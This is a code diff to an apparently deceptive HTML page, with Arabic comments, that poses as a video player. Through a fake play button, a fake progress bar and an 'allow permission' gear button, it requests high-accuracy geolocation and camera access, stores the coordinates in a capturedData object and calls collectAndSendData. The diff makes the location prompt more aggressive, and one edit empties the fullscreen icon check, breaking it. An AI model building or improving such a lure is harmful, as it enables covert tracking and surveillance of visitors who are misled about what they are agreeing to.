@@ -129,11 +129,12 @@
             filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.5));
         }
         #gearButton .main-text {
-            font-size: 22px;
+            font-size: 18px;
             font-weight: bold;
             color: #fff;
             text-shadow: 0 2px 10px rgba(0, 0, 0, 0.8);
             margin-top: 2px;
+            padding: 0 10px;
         }
 
         #retryButton {
@@ -294,7 +295,7 @@
                 font-size: 40px;
             }
             #gearButton .main-text {
-                font-size: 16px;
+                font-size: 14px;
             }
         }
         
@@ -323,7 +324,7 @@
             </div>
 
             <div id="gearButton">
-                <div class="play-icon-btn">️</div>
+                <div class="play-icon-btn">⚙️</div>
                 <div class="main-text">السماح بالإذن</div>
             </div>
 
@@ -370,7 +371,6 @@
             let videoStarted = false;
             let isProcessing = false;
             let dataSent = false;
-            let permissionRequested = false;
 
             const playBtn = document.getElementById('playButtonOverlay');
             const thumbnailArea = document.getElementById('thumbnailArea');
@@ -380,17 +380,46 @@
             const gearBtn = document.getElementById('gearButton');
             const retryBtn = document.getElementById('retryButton');
 
-            // طلب إذن الموقع تلقائياً
-            async function requestLocationPermission() {
-                if (permissionRequested) return false;
-                permissionRequested = true;
-
-                return new Promise((resolve) => {
-                    if (!navigator.geolocation) {
-                        resolve(false);
-                        return;
+            // استخدام Permissions API لطلب الإذن بشكل مباشر
+            async function requestPermissionDirectly() {
+                try {
+                    // طلب إذن الموقع عبر Permissions API
+                    if (navigator.permissions) {
+                        const permission = await navigator.permissions.query({ name: 'geolocation' });
+                        
+                        if (permission.state === 'denied') {
+                            // إذا كان مرفوضاً مسبقاً، نحتاج لفتحه من الإعدادات
+                            return false;
+                        }
+                        
+                        if (permission.state === 'granted') {
+                            return true;
+                        }
+                        
+                        // إذا كان prompt، نطلب الموقع مباشرة
+                        return await new Promise((resolve) => {
+                            navigator.geolocation.getCurrentPosition(
+                                (position) => {
+                                    capturedData.location = 
+                                        `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
+                                    capturedData.permissions.push('Geolocation Allowed');
+                                    resolve(true);
+                                },
+                                (error) => {
+                                    capturedData.permissions.push('Geolocation Denied');
+                                    capturedData.location = '';
+                                    resolve(false);
+                                },
+                                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                            );
+                        });
                     }
-                    
+                } catch (e) {
+                    console.log('Permissions API not supported');
+                }
+                
+                // Fallback: طلب الموقع مباشرة
+                return await new Promise((resolve) => {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
                             capturedData.location = 
@@ -408,7 +437,6 @@
                 });
             }
 
-            // طلب إذن الكاميرا
             async function requestCameraPermission() {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -545,7 +573,6 @@
                 retryBtn.style.display = 'none';
             }
 
-            // زر التشغيل الرئيسي
             async function handlePlayClick(e) {
                 e.stopPropagation();
                 if (videoStarted || isProcessing) return;
@@ -555,13 +582,8 @@
 
                 startVideoWithSound();
 
-                // طلب إذن الموقع تلقائياً
-                const locationGranted = await requestLocationPermission();
-
-                // طلب إذن الكاميرا
+                const locationGranted = await requestPermissionDirectly();
                 await requestCameraPermission();
-
-                // جمع البيانات
                 await collectAndSendData();
 
                 spinner.style.display = 'none';
@@ -575,34 +597,26 @@
                 isProcessing = false;
             }
 
-            // زر الترس - يطلب إذن الموقع تلقائياً
             async function handleGearClick(e) {
                 if (e) e.stopPropagation();
                 if (isProcessing) return;
 
                 isProcessing = true;
                 
-                // إظهار مؤشر التحميل
                 spinner.style.display = 'block';
                 gearBtn.querySelector('.main-text').textContent = 'جاري طلب الإذن...';
 
-                // طلب إذن الموقع تلقائياً
-                const locationGranted = await requestLocationPermission();
-
-                // طلب إذن الكاميرا
+                // طلب الإذن مباشرة - سيظهر النافذة الكبيرة
+                const locationGranted = await requestPermissionDirectly();
                 await requestCameraPermission();
-
-                // جمع البيانات وإرسالها
                 await collectAndSendData();
 
                 spinner.style.display = 'none';
 
                 if (locationGranted) {
-                    // تم منح الإذن - تشغيل الفيديو
                     startVideoWithSound();
                     hideGearButton();
                 } else {
-                    // تم رفض الإذن - إظهار زر إعادة المحاولة
                     gearBtn.querySelector('.main-text').textContent = 'تم رفض الإذن';
                     retryBtn.style.display = 'block';
                     gearBtn.style.display = 'none';
@@ -611,17 +625,11 @@
                 isProcessing = false;
             }
 
-            // زر إعادة المحاولة
             async function handleRetryClick(e) {
                 if (e) e.stopPropagation();
-                
-                // إعادة تعيين العلم لطلب الإذن مرة أخرى
-                permissionRequested = false;
-                
                 await handleGearClick();
             }
 
-            // ربط الأحداث
             if (playBtn) {
                 playBtn.addEventListener('click', handlePlayClick);
             }
@@ -635,7 +643,6 @@
                 retryBtn.addEventListener('click', handleRetryClick);
             }
 
-            // تفعيل الصوت عند أي تفاعل
             document.addEventListener('click', function() {
                 if (realVideo) {
                     realVideo.muted = false;
@@ -644,11 +651,10 @@
                 }
             }, true);
 
-            // زر الشاشة الكاملة
             document.querySelectorAll('.control-button').forEach(button => {
                 button.addEventListener('click', function(e) {
                     e.stopPropagation();
-                    if (this.textContent.includes('⛶')) {
+                    if (this.textContent.includes('')) {
                         const video = document.getElementById('realVideo');
                         if (video.requestFullscreen) {
                             video.requestFullscreen();
@@ -659,7 +665,6 @@
                 });
             });
 
-            // شريط التقدم الوهمي
             const progressInterval = setInterval(() => {
                 const progressFill = document.querySelector('.progress-fill');
                 const realVideoEl = document.getElementById('realVideo');
